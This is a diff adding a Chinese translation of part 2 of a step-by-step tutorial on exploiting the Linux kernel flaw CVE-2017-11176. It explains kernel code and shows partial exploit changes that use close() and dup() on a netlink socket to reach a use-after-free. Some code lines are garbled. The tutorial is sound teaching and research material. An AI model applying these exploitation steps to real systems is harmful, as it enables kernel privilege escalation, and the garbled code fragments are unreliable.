@@ -1,0 +1,170 @@
+**本文翻译自：[CVE-2017-11176: A step-by-step Linux Kernel exploitation (part
+2/4)](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html)**
+译者注：[前一部分链接](https://xz.aliyun.com/t/5319)
+# 使第二次循环中的fget()返回NULL
+到目前为止，在用户态下满足了触发漏洞的三个条件之一。TODO:
+  * **使netlink_attachskb()返回1**
+  * [DONE]exp线程解除阻塞
+  * **使第二次fget()调用返回NULL**
+在本节中，将尝试使第二次fget()调用返回NULL。这会使得在第二个循环期间跳到“退出路径”：
+    retry:
+                filp = fget(notification.sigev_signo);
+                if (!filp) {
+                    ret = -EBADF;
+                    goto out;           // files;
+    struct fdtable *fdt = files_fdtable(files);
+    fdt->fd[3] = NULL; // makes the second call to fget() fails
+**fget()** 的作用：
+  * 检索当前进程的“struct files_struct”
+  * 在files_struct中检索“struct fdtable”
+  * 获得“fdt->fd[fd]”的值（一个“struct file”指针）
+  * “struct file”的引用计数（如果不为NULL）加1
+  * 返回“struct file”指针
+简而言之，如果特定文件描述符在FDT中为NULL，则fget()返回NULL。
+**NOTE** :如果不记得所有这些结构之间的关系，请参考[Core
+Concept＃1](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html)。
+## 重置文件描述符表中的条目
+在stap脚本中，重置了文件描述符“3”的fdt条目（参见上一节）。怎么在用户态下做到这点？如何将FDT条目设置为NULL？
+**答案：close()系统调用。**
+这是一个简化版本（没有锁也没有出错处理）：
+    // [fs/open.c]
+        SYSCALL_DEFINE1(close, unsigned int, fd)
+        {
+          struct file * filp;
+          struct files_struct *files = current->files;
+          struct fdtable *fdt;
+          int retval;
+    [0]   fdt = files_fdtable(files);
+    [1]   filp = fdt->fd[fd];
+    [2]   rcu_assign_pointer(fdt->fd[fd], NULL); // fd[fd] = NULL
+    [3]   retval = filp_close(filp, files);
+          return retval;
+        }
+close()系统调用：
+  * [0] - 检索当前进程的FDT
+  * [1] - 检索FDT中与fd关联的struct file指针
+  * [2] - **将FDT对应条目置为NULL（无条件）**
+  * [3] - 文件对象删除引用（即调用fput()）
+我们有了一个简单的方法（无条件地）重置FDT条目。然而，它带来了另一个问题......
+## 先有蛋还是先有鸡问题
+在 _unblock_thread_
+线程调用setsockopt()之前调用close()非常诱人。问题是setsockopt()需要一个有效的文件描述符！已经通过system
+tap[尝试过](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part2.html#update-the-stap-script)。在用户态下同样遇到了这个问题......
+在调用setsocktopt()之后再调用close()会怎么样？如果我们在调用setsockopt()（解除主线程阻塞）之后再调用close()，
+**窗口期就会很小** 。
+幸运的是有一种方法！在[Core Concept＃1](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html)中，已经说过文件描述符表 **不是1：1映射**
+。几个文件描述符可能指向同一个文件对象。如何使两个文件描述符指向相同的文件对象？ **dup()系统调用** 。
+    // [fs/fcntl.c]
+        SYSCALL_DEFINE1(dup, unsigned int, fildes)
+        {
+          int ret = -EBADF;
+    [0]   struct file *file = fget(fildes);
+          if (file) {
+    [1]     ret = get_unused_fd();
+            if (ret >= 0)
+    [2]       fd_install(ret, file); // files->fdt->fd[ret] = file
+            else
+              fput(file);
+          }
+    [3]   return ret;
+        }
+dup()完全符合要求：
+  * [0] - 根据文件描述符获取相应的struct file指针。
+  * [1] - 选择下一个“未使用/可用”的文件描述符。
+  * [2] - 设置fdt中新文件描述符（[1]处获得）对应条目为相应struct file指针（[0]处获得）。
+  * [3] - 返回新的fd。
+最后，我们将有两个文件描述符指向相同文件对象：
+  * **sock_fd** ：在mq_notify()和close()使用
+  * **unblock_fd** ：在setsockopt()中使用
+## 更新exp
+更新exp（添加close/dup调用并修改setsockopt()参数）：
+    struct unblock_thread_arg
+    {
+      int sock_fd;
+      int unblock_fd;     // sock_fd);
+      _close(uta->sock_fd);                               // unblock_fd, SOL_NETLINK,       // >>
+**ALERT COBRA：第一次内核崩溃！释放后重用** 。
+崩溃的原因将在[第3部分](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html)中进行研究。
+_长话短说：由于调用了dup()，调用close()不会真的释放netlink_sock对象（只是减少了一次引用）。netlink_detachskb()实际上删除netlink_sock的最后一个引用（并释放它）。最后，在程序退出期间触发释放后重用，退出时关闭“unblock_fd”文件描述符。_
+# “retry”路径
+这节会展开部分内核代码。现在距离完整的PoC只有一步之遥。
+TODO：
+  * **使netlink_attachskb()返回1**
+  * [DONE]exp线程解除阻塞
+  * [DONE]使第二次fget()调用返回NULL
+为了执行到 **retry路径** ，需要 **netlink_attachskb()** 返回1，必须要满足第一个条件并解除线程阻塞（已经做到了）：
+    int netlink_attachskb(struct sock *sk, struct sk_buff *skb,
+                  long *timeo, struct sock *ssk)
+        {
+          struct netlink_sock *nlk;
+          nlk = nlk_sk(sk);
+    [0]   if (atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf || test_bit(0, &nlk->state))
+          {
+            // ... cut ...
+            return 1;
+          }
+          // normal path
+          return 0;
+        }
+如果满足以下条件之一，则条件[0]为真：：
+  * **sk_rmem_alloc** 大于 **sk_rcvbuf**
+  * **nlk- >state**最低有效位不为0。
+目前通过stap脚本设置“nlk->state”的最低有效位：
+    struct sock *sk = (void*) STAP_ARG_arg_sock;
+    struct netlink_sock *nlk = (void*) sk;
+    nlk->state |= 1;
+但是将套接字状态标记为“拥塞”（最低有效位）比较麻烦，只有内核态下内存分配失败才会设置这一位。这会使系统进入不稳定状态。
+相反，将尝试增加 **sk_rmem_alloc** 的值，该值表示sk的接收缓冲区“当前”大小。
+## 填充接收缓冲区
+在本节中，将尝试满足第一个条件，即“接收缓冲区已满？”：
+    atomic_read(&sk->sk_rmem_alloc) > sk->sk_rcvbuf
+struct sock（在netlink_sock中）具有以下字段：
+  * **sk_rcvbuf** ：接收缓冲区“理论上”最大大小（以字节为单位）
+  * **sk_rmem_alloc** ：接收缓冲区的“当前”大小（以字节为单位）
+  * **sk_receive_queue** ：“skb”双链表（网络缓冲区）
+**NOTE** ：sk_rcvbuf是“理论上的”，因为接收缓冲区的“当前”大小实际上可以大于它。
+在使用stap（[第1部分](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html)）输出netlink sock结构时，有：
+    - sk->sk_rmem_alloc = 0
+    - sk->sk_rcvbuf = 133120
+有两种方法使这个条件成立：
+  * 将sk_rcvbuf减小到0以下（sk_rcvbuf是整型（在我们使用的内核版本中））
+  * 将sk_rmem_alloc增加到133120字节大小以上
+## 减少sk_rcvbuf
+sk_rcvbuf在所有sock对象中通用，可以通过sock_setsockopt修改（使用SOL_SOCKET参数）：
+    // from [net/core/sock.c]
+        int sock_setsockopt(struct socket *sock, int level, int optname,
+                char __user *optval, unsigned int optlen)
+        {
+          struct sock *sk = sock->sk;
+          int val;
+          // ... cut  ...
+          case SO_RCVBUF:
+    [0]     if (val > sysctl_rmem_max)
+              val = sysctl_rmem_max;
+        set_rcvbuf:
+            sk->sk_userlocks |= SOCK_RCVBUF_LOCK;
+    [1]     if ((val * 2) sk_rcvbuf = SOCK_MIN_RCVBUF;          
+            else  
+              sk->sk_rcvbuf = val * 2;                 
+            break;
+          // ... cut (other options handling) ...
+        }
+当看到这种类型的代码时， **要注意每个表达式的类型** 。
+**NOTE**
+:“有符号/无符号类型混用”可能存在许多漏洞，将较大的类型（u64）转换成较小的类型（u32）时也是如此。这通常会导致整型溢出或类型转换问题。
+在我们使用的内核中有：
+  * **sk_rcvbuf** ：int
+  * **val** ：int
+  * **sysctl_rmem_max** ：__u32
+  * **SOCK_MIN_RCVBUF** ：由于“sizeof()”而“转变”为size_t
+SOCK_MIN_RCVBUF定义：
+    #define SOCK_MIN_RCVBUF (2048 + sizeof(struct sk_buff))
+通常有符号整型与无符号整型混合使用时，有符号整型会转换成无符号整型。
+假设“val”为负数。在[0]处，会被转换为无符号类型（因为 **sysctl_rmem_max**
+类型为“__u32”）。val会被置为sysctl_rmem_max（负数转换成无符号数会很大）。
+即使“val”没有被转换为“__u32”，也不会满足第二个条件[1]。最后被限制在[SOCK_MIN_RCVBUF，sysctl_rmem_max]之间（不是负数）。所以只能修改
+**sk_rmem_alloc** 而不是 **sk_rcvbuf** 字段。
+## 回到“正常”路径
+现在是时候回到自开始以来一直忽略的东西：mq_notify()“正常”路径。从概念上讲，当套接字接收缓冲区已满时执行“retry路径”，那么
+**正常情况下可能会填充接收缓冲区** 。
+netlink_attachskb()：
